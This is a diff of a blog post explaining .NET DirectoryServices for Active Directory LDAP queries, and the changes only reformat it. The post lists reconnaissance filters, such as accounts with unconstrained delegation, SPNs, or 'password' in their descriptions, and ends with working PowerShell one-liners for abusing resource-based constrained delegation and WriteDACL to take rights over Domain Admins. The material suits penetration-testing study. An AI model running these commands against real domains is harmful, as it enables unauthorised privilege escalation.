@@ -27,12 +27,15 @@ This post focuses the DirectoryServices (SDS) namespace which provides us easy a
 There are actually three namespace we can use to interact with the LDAP service:
 
 - System.DirectoryServices
+
 It provides easy access to Active Directory Domain Services from managed code. The namespace contains two component classes, `DirectoryEntry` and `DirectorySearcher`, which use the Active Directory Services Interfaces (ADSI) technology. 
 
 - System.DirectoryServices.ActiveDirectory
+
 It provides a high-level abstraction object model that builds around AD services tasks. It is used to automate AD management tasks and is not used to access data resides within AD.
 
 - System.DirectoryServices.Protocols
+
 Unlike the first two namespace, it has no dependencies upon the ADSI COM-based system for directory access, it supports LDAP by calling directly into the Windows LDAP library (wldap32.dll).
 
 I prefer to use the last namespace in my [ADCollector](https://github.com/dev-2null/ADCollector) because S.DS.P provides highest level of control and performance (and it seems like we can only create computer objects with the Protocols namespace). But this post is all about the first namespace System.DirectoryServices.
@@ -44,9 +47,11 @@ Each LDAP data type has a corresponding ADSI data type used to represent it with
 The .NET DirectoryServices uses two different mechanisms to translate ADSI data types to .NET data types:
 
 - DirectoryEntry
+
 Essentially a wrapper around the IADs interface, IADs is an _automation-compliant_ COM interface, it returns standard COM automation data types when the properties are accessed. The normal .NET/COM interop system has built-in marshaling for the standard variant types.
 
 - DirectorySearcher
+
 Essentially a wrapper around the ADSI IDirectorySearch interface which is _not automation compliant_, and it does not return standard COM variant types.
 
 Automation makes it possible for one application to manipulate objects implemented in another application, or to expose objects so they can be manipulated. We will talk about this later for the DirectoryEntry.
@@ -101,7 +106,6 @@ The rootDSE is a shortcut for accessing the root DSE object (a DSA-specific entr
 
 ```cs
 DirectoryEntry entry = new DirectoryEntry("LDAP://rootDSE",null,null,AuthenticationTypes.Secure);
-
 ```
 
 ### DirectorySearcher
@@ -143,10 +147,15 @@ This post does not cover much about the syntax, if you want to learn how to writ
 Here are some examples of the LDAP filters I used in ADCollector:
 
 - Accounts have Unconstrained Delegation enabled (excluding Domain Controllers)
+
 `(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!primaryGroupID=516))`
+
 - User Accounts with SPN set
+
 `(&(sAMAccountType=805306368)(servicePrincipalName=*))`
+
 - User Accounts with interesting description
+
 `(&(sAMAccountType=805306368)(description=*password*))`
 
 
@@ -155,8 +164,8 @@ Here are some examples of the LDAP filters I used in ADCollector:
 Type accelerators are aliases for .NET framework classes. They allow you to access specific .NET classes without having to explicitly type the entire class name. Luckily, two classes we need have corresponding type accelerators:
 
 ```
-adsi						System.DirectoryServices.DirectoryEntry
-adsisearcher		System.DirectoryServices.DirectorySearcher
+adsi                System.DirectoryServices.DirectoryEntry
+adsisearcher        System.DirectoryServices.DirectorySearcher
 ```
 
 To create an instance of the DirectoryEntry class using the type accelerator, you can supply a set of empty strings:
@@ -232,7 +241,7 @@ They are not recommended to use because of the property cache mechanism (Feel fr
 RefreshCache is extremely useful if we need certain constructed attributes of objects in the domain. For instance, ADCollector is able to enumerate nested group membership of domain objects. It does not simply retrieve the "memberOf" attribute of objects because this attribute only stores object's direct group membership. Instead, the "tokenGroups" attribute is retrieved since it holds both direct group membership and the recursive list of nested groups. It is a constructed attribute, its value will be calculated only when we read it. Thus, we need to use RefreshCache to load the attribute in the property cache. Here's a simple oneliner to get the nested group membership of the target object:
 
 ```powershell
-$entry=[adsisearcher]::new([adsi]"LDAP://domain.local", "(name=myuser)").FindOne().GetDirectoryEntry();$entry.RefreshCache("tokengroups");$entry.Properties["tokengroups"]|ForEach-Object{$sid=(New-Object System.Security.Principal.SecurityIdentifier($_,0)).toString();(New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount])}
+$entry=[adsisearcher]::new([adsi]"LDAP://domain.local", "(name=myuser)").FindOne().GetDirectoryEntry();$entry.RefreshCache("tokengroups");$entry.Properties["tokengroups"] | ForEach-Object{$sid=(New-Object System.Security.Principal.SecurityIdentifier($_,0)).toString();(New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount])}
 ```
 
 Back to the Invoke method, it could be quite handy in some cases comparing to the "not recommended" InvokeGet/InvokeSet. For example, ADSI has a interface called [IADsUser](https://docs.microsoft.com/en-us/windows/win32/api/iads/nn-iads-iadsuser), which allows us to access and manipulate end-user account data. One notable method is "SetPassword", it attempts to modify the password with different methods. First it will use the LDAP over SSL to set the password. If if failed, it will use Kerberos set password protocol to modify the password. And if that also failed, a Net* API remote procedure call will be initiated to set the password.
@@ -249,27 +258,39 @@ Here are a few useful commands I use frequently just for reference:
 
 - Get Domain SID
 
-`(New-Object System.Security.Principal.SecurityIdentifier([byte[]](([adsi]"LDAP://domain.local").Properties."objectSID")[0],0)).toString()`
+```powershell
+(New-Object System.Security.Principal.SecurityIdentifier([byte[]](([adsi]"LDAP://domain.local").Properties."objectSID")[0],0)).toString()
+```
 
 - Get DNS Records
 
-`([adsisearcher]::new(([adsi]"LDAP://DC=DomainDnsZones,DC=domain,DC=local"),"(&(objectClass=*)(!(DC=@))(!(DC=*DnsZones))(!(DC=*arpa))(!(DC=_*))(!dNSTombstoned=TRUE))")).FindAll() | foreach {$_.Properties["name"] ; try{$dnsByte=[byte[]]($_.Properties["dnsrecord"][0]); if ([int]$dnsByte[2]=1) {"{0}.{1}.{2}.{3}" -f $dnsByte[24],$dnsByte[25],$dnsByte[26],$dnsByte[27]}}catch{}}`
+```powershell
+([adsisearcher]::new(([adsi]"LDAP://DC=DomainDnsZones,DC=domain,DC=local"),"(&(objectClass=*)(!(DC=@))(!(DC=*DnsZones))(!(DC=*arpa))(!(DC=_*))(!dNSTombstoned=TRUE))")).FindAll() | foreach {$_.Properties["name"] ; try{$dnsByte=[byte[]]($_.Properties["dnsrecord"][0]); if ([int]$dnsByte[2]=1) {"{0}.{1}.{2}.{3}" -f $dnsByte[24],$dnsByte[25],$dnsByte[26],$dnsByte[27]}}catch{}}
+```
 
 - Get DACL of GPOs
 
-`([adsisearcher]::new([adsi]"LDAP://CN=Policies,CN=System,DC=domain,DC=local","(objectCategory=groupPolicyContainer)")).FindAll() | foreach {$_.Properties."displayname" ; $_.GetDirectoryEntry().ObjectSecurity.Access}`
+```powershell
+([adsisearcher]::new([adsi]"LDAP://CN=Policies,CN=System,DC=domain,DC=local","(objectCategory=groupPolicyContainer)")).FindAll() | foreach {$_.Properties."displayname" ; $_.GetDirectoryEntry().ObjectSecurity.Access}
+```
 
 - Identify Resources-Based Constrained Delegation (RBCD)
 
-`([adsisearcher]::new(([adsi]"LDAP://DC=domain,DC=local"),"(msDS-AllowedToActOnBehalfOfOtherIdentity=*)")).FindAll()| ForEach-Object {$_.Properties["distinguishedname"]; ConvertFrom-SddlString (New-Object Security.AccessControl.RawSecurityDescriptor([byte[]]$_.Properties["msds-allowedtoactonbehalfofotheridentity"][0],0)).GetSddlForm([Security.AccessControl.AccessControlSections]::Access) | select DiscretionaryAcl|fl}`
+```powershell
+([adsisearcher]::new(([adsi]"LDAP://DC=domain,DC=local"),"(msDS-AllowedToActOnBehalfOfOtherIdentity=*)")).FindAll()| ForEach-Object {$_.Properties["distinguishedname"]; ConvertFrom-SddlString (New-Object Security.AccessControl.RawSecurityDescriptor([byte[]]$_.Properties["msds-allowedtoactonbehalfofotheridentity"][0],0)).GetSddlForm([Security.AccessControl.AccessControlSections]::Access) | select DiscretionaryAcl|fl}
+```
 
 - Abuse RBCD
 
-`$targetEntry = ([adsisearcher]::new(([adsi]"LDAP://domain.local"),"(name=MYHOST)")).FindOne().GetDirectoryEntry(); $sid=(New-Object System.Security.Principal.SecurityIdentifier([byte[]]([adsisearcher]"(name=TARGETHOST)").FindOne().properties.objectsid[0],0)).toString();$sd=(New-Object System.Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)")); $buf = (New-Object byte[] $sd.BinaryLength); $sd.GetBinaryForm($buf, 0);$targetEntry.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Value = $buf;$targetEntry.CommitChanges();`
+```powershell
+$targetEntry = ([adsisearcher]::new(([adsi]"LDAP://domain.local"),"(name=MYHOST)")).FindOne().GetDirectoryEntry(); $sid=(New-Object System.Security.Principal.SecurityIdentifier([byte[]]([adsisearcher]"(name=TARGETHOST)").FindOne().properties.objectsid[0],0)).toString();$sd=(New-Object System.Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)")); $buf = (New-Object byte[] $sd.BinaryLength); $sd.GetBinaryForm($buf, 0);$targetEntry.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Value = $buf;$targetEntry.CommitChanges();
+```
 
 - Abuse WriteDACL to add oneself to the target group
 
-`$TargetUserSid=(New-Object System.Security.Principal.SecurityIdentifier([byte[]]([adsisearcher]"(name=myuser)").FindOne().properties.objectsid[0],0)).toString();$TargetEntry=[adsi]"LDAP://CN=Domain Admins,CN=Users,DC=domain,DC=local";$TargetEntry.PsBase.Options.SecurityMasks='Dacl';$TargetEntry.PsBase.ObjectSecurity.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule(([System.Security.Principal.IdentityReference]([System.Security.Principal.SecurityIdentifier]$TargetUserSid)), ([System.DirectoryServices.ActiveDirectoryRights]'WriteProperty'),([System.Security.AccessControl.AccessControlType]'Allow'), ([System.DirectoryServices.ActiveDirectorySecurityInheritance]'None'))));$TargetEntry.PsBase.CommitChanges()`
+```powershell
+$TargetUserSid=(New-Object System.Security.Principal.SecurityIdentifier([byte[]]([adsisearcher]"(name=myuser)").FindOne().properties.objectsid[0],0)).toString();$TargetEntry=[adsi]"LDAP://CN=Domain Admins,CN=Users,DC=domain,DC=local";$TargetEntry.PsBase.Options.SecurityMasks='Dacl';$TargetEntry.PsBase.ObjectSecurity.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule(([System.Security.Principal.IdentityReference]([System.Security.Principal.SecurityIdentifier]$TargetUserSid)), ([System.DirectoryServices.ActiveDirectoryRights]'WriteProperty'),([System.Security.AccessControl.AccessControlType]'Allow'), ([System.DirectoryServices.ActiveDirectorySecurityInheritance]'None'))));$TargetEntry.PsBase.CommitChanges()
+```
 
 
 ## References
